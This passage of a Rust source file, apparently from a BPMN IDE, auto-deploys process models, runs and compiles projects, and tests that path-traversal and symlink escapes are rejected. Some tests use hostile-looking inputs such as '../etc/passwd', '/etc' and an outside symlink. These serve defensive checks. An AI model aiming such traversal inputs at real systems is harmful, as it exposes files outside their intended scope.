            if !resolved.starts_with(&root_canonical) {
                // Symlink chain escaped the project root — refuse to sweep.
                continue;
            }
            if !resolved.is_dir() {
                continue;
            }
            let mut rd = match tokio::fs::read_dir(&resolved).await {
                Ok(rd) => rd,
                Err(_) => continue,
            };
            let mut names: Vec<String> = Vec::new();
            while let Ok(Some(entry)) = rd.next_entry().await {
                if !entry
                    .file_type()
                    .await
                    .ok()
                    .map(|t| t.is_file())
                    .unwrap_or(false)
                {
                    continue;
                }
                let Some(name) = entry.file_name().into_string().ok() else {
                    continue;
                };
                let lower = name.to_ascii_lowercase();
                if lower.ends_with(".bpmn") || lower.ends_with(".dmn") || lower.ends_with(".form") {
                    names.push(name);
                }
            }
            names.sort();
            for n in names {
                files.push(resolved.join(n));
            }
        }
        files
    }

    /// Sweeps the configured `auto_deploy` dirs (default `models/`, `decisions/`,
    /// `forms/`) for `.bpmn`, `.dmn`, `.form` files and POSTs each one to
    /// `<base_url>/v2/deployments` as multipart. Streams progress to the project
    /// log so users see each deployment (or failure) in the Output pane.
    ///
    /// Deliberately best-effort: a failing deploy logs and moves on, and the
    /// app is still started — the alternative would be that a temporarily-down
    /// gateway blocks running a self-hosting app entirely. Templates that need
    /// deploy-strict semantics can turn this off (`autoDeploy: []`) and drive
    /// deployment from their own bootstrap.
    async fn auto_deploy_resources(
        cfg: &ProjectConfig,
        dir: &Path,
        base_url: &str,
        inner: &Arc<ProjectInner>,
    ) {
        let dirs = &cfg.auto_deploy;
        if dirs.is_empty() {
            return;
        }
        let files = Self::discover_deployables(dir, dirs).await;
        if files.is_empty() {
            return;
        }
        let client = match reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                inner
                    .push_log(
                        "err",
                        format!("auto-deploy: could not build http client: {e}"),
                    )
                    .await;
                return;
            }
        };
        let url = format!("{}/v2/deployments", base_url.trim_end_matches('/'));
        inner
            .push_log(
                "sys",
                format!("auto-deploy: {} resource(s) -> {url}", files.len()),
            )
            .await;
        for path in &files {
            let rel = path.strip_prefix(dir).unwrap_or(path).display().to_string();
            let name = path
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap_or("resource")
                .to_string();
            let bytes = match tokio::fs::read(path).await {
                Ok(b) => b,
                Err(e) => {
                    inner
                        .push_log("err", format!("auto-deploy: {rel}: read failed: {e}"))
                        .await;
                    continue;
                }
            };
            let mime = if name.to_ascii_lowercase().ends_with(".form") {
                "application/json"
            } else {
                "text/xml"
            };
            let part = match reqwest::multipart::Part::bytes(bytes)
                .file_name(name.clone())
                .mime_str(mime)
            {
                Ok(p) => p,
                Err(e) => {
                    inner
                        .push_log("err", format!("auto-deploy: {rel}: {e}"))
                        .await;
                    continue;
                }
            };
            let form = reqwest::multipart::Form::new().part("resources", part);
            match client.post(&url).multipart(form).send().await {
                Ok(resp) if resp.status().is_success() => {
                    inner
                        .push_log("sys", format!("auto-deploy: deployed {rel}"))
                        .await;
                }
                Ok(resp) => {
                    let status = resp.status();
                    // Cap the read so an unfriendly proxy (nginx HTML error page,
                    // a huge JSON blob) can't balloon memory just to log one line.
                    const MAX_ERR_BODY: u64 = 4 * 1024;
                    let short_body = if resp.content_length().unwrap_or(0) > MAX_ERR_BODY {
                        String::new()
                    } else {
                        resp.text().await.unwrap_or_default()
                    };
                    let body = short_body
                        .lines()
                        .next()
                        .unwrap_or("")
                        .chars()
                        .take(200)
                        .collect::<String>();
                    inner
                        .push_log("err", format!("auto-deploy: {rel}: HTTP {status} {body}"))
                        .await;
                }
                Err(e) => {
                    inner
                        .push_log("err", format!("auto-deploy: {rel}: {e}"))
                        .await;
                }
            }
        }
    }

    /// Spawns `deno run main.ts` for a project. Idempotent if already running.
    pub async fn run(&self, name: &str) -> Result<(), String> {
        let dir = project_dir(name).ok_or("invalid project name")?;
        if !dir.is_dir() {
            return Err("no such project".into());
        }
        let cfg = read_config(name).ok_or("no such project")?;
        // Toolchain dispatch (ADR 0007/0008/…): the project owns its Run/Compile
        // invocation via `cfg.toolchain` — snapshotted from the scaffolding pack
        // so pack updates or uninstalls don't break existing projects. A
        // lang-pack-scaffolded project (e.g. Rust starter) has no snapshot and
        // falls back to the lang pack. Only plain `deno` with nothing declared
        // falls through to the built-in Deno runner below.
        if let Some((argv, trust_id)) = resolve_run_argv(&cfg) {
            return self.run_toolchain(name, &cfg, &dir, argv, trust_id).await;
        }
        let deno = workers::find_deno().ok_or_else(|| {
            "Deno runtime not found. Install Deno (https://deno.com) or set NANOBPMN_DENO_BIN."
                .to_string()
        })?;

        let inner = self.entry(name).await;
        if matches!(*inner.phase.lock().await, Phase::Starting | Phase::Running) {
            return Ok(());
        }
        *inner.phase.lock().await = Phase::Starting;
        let _ = ensure_project_sdk(name);

        let entry = dir.join(&cfg.main);
        if !entry.is_file() {
            *inner.phase.lock().await = Phase::Stopped;
            return Err(format!("entrypoint {} not found", cfg.main));
        }
        // Canonicalize so the --allow-read scope matches the path Deno resolves
        // (e.g. macOS /tmp -> /private/tmp), otherwise reads are denied.
        let dir = std::fs::canonicalize(&dir).unwrap_or(dir);
        let cache = dir.join(".deno-cache");
        let _ = std::fs::create_dir_all(&cache);
        let base_url = Self::base_url(&cfg);

        Self::auto_deploy_resources(&cfg, &dir, &base_url, &inner).await;

        let mut cmd = Command::new(&deno);
        cmd.current_dir(&dir)
            .arg("run")
            .arg("--no-prompt")
            .arg("--allow-net")
            .arg(format!("--allow-read={}", dir.display()))
            .arg(format!("--allow-write={}", cache.display()))
            .arg("--allow-env")
            .arg(&cfg.main)
            .env("DENO_DIR", &cache)
            .env("NO_COLOR", "1")
            .env("NANOBPMN_BASE_URL", &base_url)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true);
        // Even when the toolchain argv resolves to the built-in Deno runner,
        // an active run config's `env` must still be honored — otherwise
        // env-only runConfigs (e.g. different NANOBPMN_BASE_URL per target)
        // silently no-op for Deno projects. Same precedence as run_toolchain:
        // base spawn env above, then active-config env last-wins.
        for (k, v) in resolve_run_env(&cfg) {
            cmd.env(k, v);
        }

        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                *inner.phase.lock().await = Phase::Stopped;
                return Err(format!("failed to spawn deno: {e}"));
            }
        };
        let pid = child.id().unwrap_or(0);
        inner.pid.store(pid, Ordering::Relaxed);
        inner.desired_running.store(true, Ordering::Relaxed);
        *inner.phase.lock().await = Phase::Running;
        *inner.started_at_ms.lock().await = Some(now_ms());
        *inner.last_error.lock().await = None;
        inner
            .push_log(
                "sys",
                format!("running {} (pid {pid}) -> {base_url}", cfg.main),
            )
            .await;

        if let Some(stdout) = child.stdout.take() {
            let inner = inner.clone();
            tokio::spawn(async move {
                let mut lines = BufReader::new(stdout).lines();
                while let Ok(Some(line)) = lines.next_line().await {
                    if line.starts_with(METRIC_PREFIX) {
                        continue; // per-worker metric telemetry — not shown
                    } else if let Some(rest) = line.strip_prefix(STATUS_PREFIX) {
                        let msg = serde_json::from_str::<serde_json::Value>(rest)
                            .ok()
                            .map(|v| {
                                format!(
                                    "{}: {}",
                                    v.get("state").and_then(|s| s.as_str()).unwrap_or("status"),
                                    v.get("message").and_then(|s| s.as_str()).unwrap_or("")
                                )
                            })
                            .unwrap_or_else(|| rest.to_string());
                        inner.push_log("sys", msg).await;
                    } else {
                        inner.push_log("out", line).await;
                    }
                }
            });
        }
        if let Some(stderr) = child.stderr.take() {
            let inner = inner.clone();
            tokio::spawn(async move {
                let mut lines = BufReader::new(stderr).lines();
                while let Ok(Some(line)) = lines.next_line().await {
                    inner.push_log("err", line).await;
                }
            });
        }

        let inner = inner.clone();
        tokio::spawn(async move {
            let status = tokio::select! {
                _ = inner.stop.notified() => {
                    let _ = child.start_kill();
                    inner.push_log("sys", "stop requested; terminating".into()).await;
                    child.wait().await.ok()
                }
                st = child.wait() => st.ok(),
            };
            inner.pid.store(0, Ordering::Relaxed);
            let desired = inner.desired_running.load(Ordering::Relaxed);
            let code = status.and_then(|s| s.code());
            if !desired {
                *inner.phase.lock().await = Phase::Stopped;
                inner.push_log("sys", "application stopped".into()).await;
            } else if code == Some(0) {
                // Finite apps (e.g. the Throughput Explorer) exit 0 when their
                // work is done — a clean completion, not a crash.
                inner.desired_running.store(false, Ordering::Relaxed);
                *inner.phase.lock().await = Phase::Stopped;
                inner.push_log("sys", "application finished".into()).await;
            } else {
                *inner.phase.lock().await = Phase::Crashed;
                inner.desired_running.store(false, Ordering::Relaxed);
                *inner.last_error.lock().await = Some(format!("exited with code {code:?}"));
                inner
                    .push_log("sys", format!("application exited (code {code:?})"))
                    .await;
            }
        });

        Ok(())
    }

    /// Runs a project via its resolved toolchain argv (from `cfg.toolchain`
    /// or the lang pack). Gated by the extension trust store (approving the
    /// pack that contributed the argv); the toolchain binary must be on PATH.
    async fn run_toolchain(
        &self,
        name: &str,
        cfg: &ProjectConfig,
        dir: &Path,
        argv: Vec<String>,
        trust_ext_id: String,
    ) -> Result<(), String> {
        if argv.is_empty() {
            return Err("no run command configured for this project".into());
        }
        if !super::extensions::is_trusted(&trust_ext_id) {
            return Err(format!(
                "extension '{trust_ext_id}' is not approved to run toolchain commands; approve it (or enable yolo) in Extensions"
            ));
        }
        let bin = super::extensions::find_program(&argv[0])
            .ok_or_else(|| format!("toolchain '{}' not found — install it and retry", argv[0]))?;
        let inner = self.entry(name).await;
        if matches!(*inner.phase.lock().await, Phase::Starting | Phase::Running) {
            return Ok(());
        }
        *inner.phase.lock().await = Phase::Starting;
        let dir = std::fs::canonicalize(dir).unwrap_or_else(|_| dir.to_path_buf());
        let base_url = Self::base_url(cfg);
        Self::auto_deploy_resources(cfg, &dir, &base_url, &inner).await;
        let mut cmd = Command::new(&bin);
        cmd.current_dir(&dir)
            .args(&argv[1..])
            .env("NO_COLOR", "1")
            .env("NANOBPMN_BASE_URL", &base_url)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true);
        // Layer the active run-config's env on top — overrides on key clash so
        // configs can, e.g., pin CAMUNDA_REST_ADDRESS per combo.
        for (k, v) in resolve_run_env(cfg) {
            cmd.env(k, v);
        }
        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                *inner.phase.lock().await = Phase::Stopped;
                return Err(format!("failed to spawn {}: {e}", argv[0]));
            }
        };
        let pid = child.id().unwrap_or(0);
        inner.pid.store(pid, Ordering::Relaxed);
        inner.desired_running.store(true, Ordering::Relaxed);
        *inner.phase.lock().await = Phase::Running;
        *inner.started_at_ms.lock().await = Some(now_ms());
        *inner.last_error.lock().await = None;
        inner
            .push_log(
                "sys",
                format!("running {} (pid {pid}) -> {base_url}", argv.join(" ")),
            )
            .await;
        if let Some(stdout) = child.stdout.take() {
            let inner = inner.clone();
            tokio::spawn(async move {
                let mut lines = BufReader::new(stdout).lines();
                while let Ok(Some(line)) = lines.next_line().await {
                    inner.push_log("out", line).await;
                }
            });
        }
        if let Some(stderr) = child.stderr.take() {
            let inner = inner.clone();
            tokio::spawn(async move {
                let mut lines = BufReader::new(stderr).lines();
                while let Ok(Some(line)) = lines.next_line().await {
                    inner.push_log("err", line).await;
                }
            });
        }
        let inner = inner.clone();
        tokio::spawn(async move {
            let status = tokio::select! {
                _ = inner.stop.notified() => { let _ = child.start_kill(); child.wait().await.ok() }
                st = child.wait() => st.ok(),
            };
            inner.pid.store(0, Ordering::Relaxed);
            let desired = inner.desired_running.load(Ordering::Relaxed);
            let code = status.and_then(|s| s.code());
            if !desired || code == Some(0) {
                inner.desired_running.store(false, Ordering::Relaxed);
                *inner.phase.lock().await = Phase::Stopped;
                inner.push_log("sys", "application finished".into()).await;
            } else {
                *inner.phase.lock().await = Phase::Crashed;
                inner.desired_running.store(false, Ordering::Relaxed);
                *inner.last_error.lock().await = Some(format!("exited with code {code:?}"));
                inner
                    .push_log("sys", format!("application exited (code {code:?})"))
                    .await;
            }
        });
        Ok(())
    }

    /// Stops a running project. No-op if not running.
    pub async fn stop(&self, name: &str) -> Result<(), String> {
        let inner = self.entry(name).await;
        if matches!(*inner.phase.lock().await, Phase::Stopped | Phase::Crashed) {
            return Ok(());
        }
        inner.desired_running.store(false, Ordering::Relaxed);
        inner.stop.notify_waiters();
        Ok(())
    }

    /// Compiles the project into `dist/` — once for the host, or once per
    /// requested target triple for cross-compilation. Streams progress to the
    /// project log channel and resolves when all builds finish.
    pub async fn compile(&self, name: &str, targets: &[String]) -> Result<Vec<String>, String> {
        let dir = project_dir(name).ok_or("invalid project name")?;
        if !dir.is_dir() {
            return Err("no such project".into());
        }
        let cfg = read_config(name).ok_or("no such project")?;
        // Same dispatch as run(): project snapshot > lang pack > built-in Deno.
        // The old `cfg.lang != "deno"` gate meant a project scaffolded before
        // requires[] was mandatory got its Java source pumped through
        // `deno compile`.
        if let Some((argv, trust_id)) = resolve_compile_argv(&cfg) {
            return self
                .compile_toolchain(name, &cfg, &dir, argv, trust_id)
                .await;
        }
        let deno = workers::find_deno().ok_or_else(|| {
            "Deno runtime not found. Install Deno (https://deno.com) or set NANOBPMN_DENO_BIN."
                .to_string()
        })?;
        let inner = self.entry(name).await;
        if inner.compiling.swap(true, Ordering::Relaxed) {
            return Err("a compile is already in progress".into());
        }

        let dist = dir.join("dist");
        let _ = std::fs::create_dir_all(&dist);
        let cache = dir.join(".deno-cache");
        let _ = std::fs::create_dir_all(&cache);

        // Empty target list => compile for the host only.
        let mut effective: Vec<Option<String>> = Vec::new();
        if targets.is_empty() {
            effective.push(None);
        } else {
            let allowed: BTreeSet<&str> = PLATFORMS.iter().copied().collect();
            for t in targets {
                if !allowed.contains(t.as_str()) {
                    inner.compiling.store(false, Ordering::Relaxed);
                    return Err(format!("unsupported target: {t}"));
                }
                effective.push(Some(t.clone()));
            }
        }

        let mut produced = Vec::new();
        let mut failure: Option<String> = None;
        for target in &effective {
            let out_name = match target {
                Some(t) => format!("{name}-{t}"),
                None => name.to_string(),
            };
            let mut out_path = dist.join(&out_name);
            if matches!(target.as_deref(), Some(t) if t.contains("windows")) {
                out_path.set_extension("exe");
            }
            inner
                .push_log(
                    "sys",
                    match target {
                        Some(t) => format!("compiling for {t}..."),
                        None => "compiling for host...".to_string(),
                    },
                )
                .await;

            let mut cmd = Command::new(&deno);
            cmd.current_dir(&dir)
                .arg("compile")
                .arg("--allow-net")
                .arg("--allow-read")
                .arg("--allow-write")
                .arg("--allow-env")
                .arg("--no-prompt");
            if let Some(t) = target {
                cmd.arg("--target").arg(t);
            }
            cmd.arg("--output")
                .arg(&out_path)
                .arg(&cfg.main)
                .env("DENO_DIR", &cache)
                .env("NO_COLOR", "1")
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped());
            // Layer active run-config env onto the built-in Deno compile too;
            // otherwise env-only runConfigs no-op on Deno projects during
            // Compile (see run() for the symmetric fix and rationale).
            for (k, v) in resolve_run_env(&cfg) {
                cmd.env(k, v);
            }

            let child = cmd
                .spawn()
                .map_err(|e| format!("failed to spawn deno: {e}"));
            let mut child = match child {
                Ok(c) => c,
                Err(e) => {
                    failure = Some(e);
                    break;
                }
            };
            if let Some(stdout) = child.stdout.take() {
                let inner = inner.clone();
                tokio::spawn(async move {
                    let mut lines = BufReader::new(stdout).lines();
                    while let Ok(Some(line)) = lines.next_line().await {
                        inner.push_log("out", line).await;
                    }
                });
            }
            if let Some(stderr) = child.stderr.take() {
                let inner = inner.clone();
                tokio::spawn(async move {
                    let mut lines = BufReader::new(stderr).lines();
                    while let Ok(Some(line)) = lines.next_line().await {
                        inner.push_log("err", line).await;
                    }
                });
            }
            match child.wait().await {
                Ok(st) if st.success() => {
                    let rel = format!("dist/{}", out_path.file_name().unwrap().to_string_lossy());
                    inner.push_log("sys", format!("built {rel}")).await;
                    produced.push(rel);
                }
                Ok(st) => {
                    failure = Some(format!("deno compile failed (code {:?})", st.code()));
                    break;
                }
                Err(e) => {
                    failure = Some(format!("deno compile error: {e}"));
                    break;
                }
            }
        }

        inner.compiling.store(false, Ordering::Relaxed);
        match failure {
            Some(e) => {
                inner.push_log("sys", format!("compile failed: {e}")).await;
                Err(e)
            }
            None => {
                inner
                    .push_log(
                        "sys",
                        format!("compile complete ({} artifact(s))", produced.len()),
                    )
                    .await;
                Ok(produced)
            }
        }
    }

    /// Compiles a project via its resolved toolchain argv (from `cfg.toolchain`
    /// or the lang pack), streaming output. Host target only; cross-compile is
    /// a pack concern. Gated by the trust store on the argv-contributing pack.
    async fn compile_toolchain(
        &self,
        name: &str,
        cfg: &ProjectConfig,
        dir: &Path,
        argv: Vec<String>,
        trust_ext_id: String,
    ) -> Result<Vec<String>, String> {
        if argv.is_empty() {
            return Err("no compile command configured for this project".into());
        }
        if !super::extensions::is_trusted(&trust_ext_id) {
            return Err(format!(
                "extension '{trust_ext_id}' is not approved; approve it in Extensions"
            ));
        }
        let bin = super::extensions::find_program(&argv[0])
            .ok_or_else(|| format!("toolchain '{}' not found", argv[0]))?;
        let inner = self.entry(name).await;
        if inner.compiling.swap(true, Ordering::Relaxed) {
            return Err("a compile is already in progress".into());
        }
        inner
            .push_log("sys", format!("compiling: {}", argv.join(" ")))
            .await;
        let mut cmd = Command::new(&bin);
        cmd.current_dir(dir)
            .args(&argv[1..])
            .env("NO_COLOR", "1")
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        for (k, v) in resolve_run_env(cfg) {
            cmd.env(k, v);
        }
        let result = match cmd.spawn() {
            Ok(mut child) => {
                if let Some(o) = child.stdout.take() {
                    let inner = inner.clone();
                    tokio::spawn(async move {
                        let mut l = BufReader::new(o).lines();
                        while let Ok(Some(line)) = l.next_line().await {
                            inner.push_log("out", line).await;
                        }
                    });
                }
                if let Some(e) = child.stderr.take() {
                    let inner = inner.clone();
                    tokio::spawn(async move {
                        let mut l = BufReader::new(e).lines();
                        while let Ok(Some(line)) = l.next_line().await {
                            inner.push_log("err", line).await;
                        }
                    });
                }
                match child.wait().await {
                    Ok(st) if st.success() => Ok(vec!["target/release/".to_string()]),
                    Ok(st) => Err(format!("compile failed (code {:?})", st.code())),
                    Err(e) => Err(format!("compile error: {e}")),
                }
            }
            Err(e) => Err(format!("failed to spawn {}: {e}", argv[0])),
        };
        inner.compiling.store(false, Ordering::Relaxed);
        match &result {
            Ok(_) => inner.push_log("sys", "compile complete".into()).await,
            Err(e) => inner.push_log("sys", format!("compile failed: {e}")).await,
        }
        result
    }
}

#[cfg(test)]
mod tests {
    use std::sync::atomic::{AtomicU64, Ordering as AOrd};
    use std::sync::{Mutex, MutexGuard, OnceLock};

    use super::*;

    /// Serializes tests that mutate the process-global `NANOBPMN_PROJECTS_DIR`.
    fn lock() -> MutexGuard<'static, ()> {
        static L: OnceLock<Mutex<()>> = OnceLock::new();
        L.get_or_init(|| Mutex::new(()))
            .lock()
            .unwrap_or_else(|e| e.into_inner())
    }

    fn temp_root() -> PathBuf {
        static N: AtomicU64 = AtomicU64::new(0);
        let p = std::env::temp_dir().join(format!(
            "nano-proj-test-{}-{}",
            std::process::id(),
            N.fetch_add(1, AOrd::Relaxed)
        ));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        unsafe {
            std::env::set_var("NANOBPMN_PROJECTS_DIR", &p);
        }
        p
    }

    #[test]
    fn safe_project_path_rejects_traversal() {
        let _g = lock();
        let _root = temp_root();
        assert!(safe_project_path("app", "../etc/passwd").is_none());
        assert!(safe_project_path("app", "/abs").is_some()); // leading / stripped
        assert!(safe_project_path("app", "a/../b").is_none());
        assert!(safe_project_path("app", "resources/processes/x.bpmn").is_some());
        assert!(safe_project_path("../bad", "x").is_none());
    }

    // --- discover_deployables --------------------------------------------

    fn touch(path: &Path, body: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, body).unwrap();
    }

    /// A unique temp dir that doesn't touch `NANOBPMN_PROJECTS_DIR`, so async
    /// tests don't need to hold a std Mutex across `.await`.
    fn scratch_dir(tag: &str) -> PathBuf {
        static N: AtomicU64 = AtomicU64::new(0);
        let p = std::env::temp_dir().join(format!(
            "nano-discover-{}-{}-{}",
            tag,
            std::process::id(),
            N.fetch_add(1, AOrd::Relaxed)
        ));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        p
    }

    #[tokio::test]
    async fn discover_finds_configured_extensions_sorted_per_dir() {
        let root = scratch_dir("sorted").join("p1");
        std::fs::create_dir_all(&root).unwrap();
        touch(&root.join("models/onboarding.bpmn"), "<x/>");
        touch(&root.join("models/adhoc.bpmn"), "<x/>");
        touch(&root.join("models/README.md"), "not deployable");
        touch(&root.join("decisions/pricing.dmn"), "<x/>");
        touch(&root.join("forms/consent.form"), "{}");
        // Case-insensitive extension match, still picked up.
        touch(&root.join("models/EDGE.BPMN"), "<x/>");

        let dirs = vec!["models".into(), "decisions".into(), "forms".into()];
        let files = ProjectSupervisor::discover_deployables(&root, &dirs).await;
        let names: Vec<_> = files
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            names,
            vec![
                "EDGE.BPMN",
                "adhoc.bpmn",
                "onboarding.bpmn",
                "pricing.dmn",
                "consent.form",
            ],
            "files must group by configured dir + sort within each"
        );
    }

    #[tokio::test]
    async fn discover_empty_list_disables_sweep() {
        let root = scratch_dir("empty").join("p2");
        std::fs::create_dir_all(&root).unwrap();
        touch(&root.join("models/x.bpmn"), "<x/>");
        let files = ProjectSupervisor::discover_deployables(&root, &[]).await;
        assert!(files.is_empty(), "autoDeploy: [] must skip discovery");
    }

    #[tokio::test]
    async fn discover_rejects_dotdot_traversal() {
        let sandbox = scratch_dir("dotdot").join("sandbox");
        std::fs::create_dir_all(&sandbox).unwrap();
        // A "leak" dir outside the project that contains a bpmn file the
        // attacker would like to exfiltrate.
        touch(&sandbox.join("leak/secret.bpmn"), "<pwned/>");
        let root = sandbox.join("project");
        std::fs::create_dir_all(&root).unwrap();
        touch(&root.join("models/legit.bpmn"), "<ok/>");

        let dirs = vec!["../leak".into(), "models".into()];
        let files = ProjectSupervisor::discover_deployables(&root, &dirs).await;
        let names: Vec<_> = files
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, vec!["legit.bpmn"], "'../leak' must be rejected");
    }

    #[tokio::test]
    async fn discover_rejects_absolute_paths() {
        let root = scratch_dir("abs").join("p3");
        std::fs::create_dir_all(&root).unwrap();
        touch(&root.join("models/x.bpmn"), "<x/>");

        let dirs = vec!["/etc".into(), "models".into()];
        let files = ProjectSupervisor::discover_deployables(&root, &dirs).await;
        let names: Vec<_> = files
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, vec!["x.bpmn"], "absolute paths must be rejected");
    }

    #[tokio::test]
    async fn discover_symlink_escape_rejected() {
        let sandbox = scratch_dir("symlink").join("sandbox2");
        std::fs::create_dir_all(&sandbox).unwrap();
        touch(&sandbox.join("outside/secret.bpmn"), "<pwned/>");
        let root = sandbox.join("project");
        std::fs::create_dir_all(&root).unwrap();
        // symlink `models` in the project to a directory *outside* the project.
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(sandbox.join("outside"), root.join("models"))
                .expect("symlink");
            let files = ProjectSupervisor::discover_deployables(&root, &["models".into()]).await;
            assert!(files.is_empty(), "symlink escape must be rejected");
        }
    }

    #[test]
    fn gui_template_sets_app_and_serves_public() {
        let _g = lock();
        let root = temp_root();
        let cfg = create_project("gdemo", "", "gui-starter").expect("create");
        assert_eq!(cfg.app, "deno-gui");
        let dir = root.join("gdemo");
        assert!(dir.join("public/index.html").is_file());
        assert!(dir.join("main.ts").is_file());
    }

    #[test]
    fn project_templates_merges_pack_templates_after_builtins() {
        let _g = lock();
        let _root = temp_root();
        let ext = std::env::temp_dir().join(format!("nano-ext-tpl-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&ext);
        let pack = ext.join("nanobpm__app-embedded-nano");
        std::fs::create_dir_all(pack.join("templates/embedded-starter")).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"embedded-nano","kind":"app","displayName":"Embedded μ-nano app",
                 "templates":[{"id":"embedded-starter","label":"Embedded engine"}]}"#,
        )
        .unwrap();
        // Also drop a pack that shadows a built-in id; the built-in must win.
        let shadow = ext.join("nanobpm__shadow");
        std::fs::create_dir_all(shadow.join("templates/starter")).unwrap();
        std::fs::write(
            shadow.join("nano-ide.ext.json"),
            r#"{"id":"shadow","kind":"app","displayName":"Shadow",
                 "templates":[{"id":"starter","label":"Should not appear"}]}"#,
        )
        .unwrap();
        // An example pack advertises itself as a template — no lang-pack
        // registration required. This is what a third-party publishing a
        // runnable example gets for free.
        let example = ext.join("nanobpm__example-thing");
        std::fs::create_dir_all(example.join("app")).unwrap();
        std::fs::write(
            example.join("nano-ide.ext.json"),
            r#"{"id":"thing-example","kind":"example","displayName":"Thing example",
                 "summary":"Runs the thing","appDir":"app"}"#,
        )
        .unwrap();

        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
        let templates = project_templates();
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let _ = std::fs::remove_dir_all(&ext);

        // Built-ins come first, in order, each tagged source=builtin.
        for (i, (id, _label)) in TEMPLATES.iter().enumerate() {
            assert_eq!(templates[i]["id"].as_str(), Some(*id));
            assert_eq!(templates[i]["source"].as_str(), Some("builtin"));
        }
        // The pack template appears exactly once, after the built-ins, with pack provenance.
        let pack_hits: Vec<_> = templates
            .iter()
            .filter(|t| t["id"] == "embedded-starter")
            .collect();
        assert_eq!(pack_hits.len(), 1, "pack template should appear once");
        assert_eq!(pack_hits[0]["source"].as_str(), Some("pack"));
        assert_eq!(pack_hits[0]["pack"].as_str(), Some("embedded-nano"));
        assert_eq!(pack_hits[0]["label"].as_str(), Some("Embedded engine"));
        // The shadowing pack's `starter` must not have overridden the built-in
        // (only one entry with id="starter", and its source is "builtin").
        let starter_hits: Vec<_> = templates.iter().filter(|t| t["id"] == "starter").collect();
        assert_eq!(starter_hits.len(), 1);
        assert_eq!(starter_hits[0]["source"].as_str(), Some("builtin"));
        // The example pack should appear as a template automatically, with its
        // display name + summary composed into the label.
        let ex_hits: Vec<_> = templates
            .iter()
            .filter(|t| t["id"] == "thing-example")
            .collect();
        assert_eq!(ex_hits.len(), 1, "example pack should auto-register");
        assert_eq!(ex_hits[0]["source"].as_str(), Some("pack"));
        assert_eq!(ex_hits[0]["pack"].as_str(), Some("thing-example"));
        assert_eq!(
            ex_hits[0]["label"].as_str(),
            Some("Thing example — Runs the thing")
        );
    }

    #[test]
    fn installed_example_pack_is_scaffolded() {
        let _g = lock();
        let root = temp_root();
        let ext = root.join("ext-store");
        let pack = ext.join("nanobpm__example-demo");
        std::fs::create_dir_all(pack.join("app/src")).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"demo-ex","kind":"example","displayName":"Demo","requires":["rust"],"appDir":"app"}"#,
        )
        .unwrap();
        std::fs::write(pack.join("app/Cargo.toml"), "[package]\n").unwrap();
        std::fs::write(pack.join("app/src/main.rs"), "fn main(){}\n").unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
        let cfg = create_project("exdemo", "", "demo-ex").expect("create");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        assert_eq!(cfg.lang, "rust");
        assert_eq!(cfg.main, "src/main.rs");
        let dir = root.join("exdemo");
        assert!(dir.join("Cargo.toml").is_file());
        assert!(dir.join("src/main.rs").is_file());
    }

    /// Regression: a Java pack scaffold must NOT get the Deno-flavoured
    /// built-in files (main.ts, deno.json, workers/do-work, lib/nano.ts,
    /// .nanobpm/worker-sdk.ts, resources/processes/*.bpmn from the built-in
    /// starter). Everything must come from the pack.
    #[test]
    fn java_pack_scaffold_does_not_get_deno_files() {
        let _g = lock();
        let root = temp_root();
        let ext = root.join("ext-store");
        let pack = ext.join("nanobpm__example-throughput-jvm");
        std::fs::create_dir_all(pack.join("app/src/main/java/com/example")).unwrap();
        std::fs::create_dir_all(pack.join("app/src/main/resources")).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"throughput-jvm","kind":"example","displayName":"T","requires":["java","maven"],"appDir":"app"}"#,
        )
        .unwrap();
        std::fs::write(pack.join("app/pom.xml"), "<project/>\n").unwrap();
        std::fs::write(
            pack.join("app/src/main/java/com/example/Main.java"),
            "class Main{}\n",
        )
        .unwrap();
        std::fs::write(
            pack.join("app/src/main/resources/throughput.bpmn"),
            "<bpmn/>",
        )
        .unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
        let cfg = create_project("jbench", "", "throughput-jvm").expect("create");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        assert_eq!(cfg.lang, "java");
        assert_eq!(cfg.main, "pom.xml");
        let dir = root.join("jbench");
        // Pack contents made it in (appDir contents copied to project root).
        assert!(dir.join("pom.xml").is_file());
        assert!(dir.join("src/main/java/com/example/Main.java").is_file());
        assert!(dir.join("src/main/resources/throughput.bpmn").is_file());
        // Deno-flavoured built-ins must NOT be present.
        assert!(!dir.join("main.ts").exists(), "Deno main.ts leaked");
        assert!(!dir.join("deno.json").exists(), "Deno deno.json leaked");
        assert!(!dir.join("lib/nano.ts").exists(), "Deno lib/nano.ts leaked");
        assert!(
